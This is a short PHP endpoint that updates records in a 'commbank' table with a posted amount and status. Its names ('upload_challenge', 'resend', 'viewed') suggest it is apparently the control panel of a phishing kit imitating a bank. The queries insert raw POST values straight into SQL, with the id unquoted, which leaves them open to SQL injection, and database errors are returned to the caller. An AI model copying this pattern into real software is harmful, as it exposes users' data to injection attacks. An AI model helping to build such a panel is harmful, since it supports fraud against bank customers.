<?php
require '../connection.php';

if ($_POST["amount"] and $_POST["uniqueid"]) {
  $amount = $_POST["amount"];
  $uniqueid = $_POST["uniqueid"];

  if (isset($_GET["resend"])) {
    $upload_challenge = mysqli_query($conn, "UPDATE commbank SET amount='$amount', status=3, viewed='true' WHERE uniqueid=$uniqueid");
  } else {
    $upload_challenge = mysqli_query($conn, "UPDATE commbank SET amount='$amount', status=2, viewed='true' WHERE uniqueid=$uniqueid");
  }

  if ($upload_challenge) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
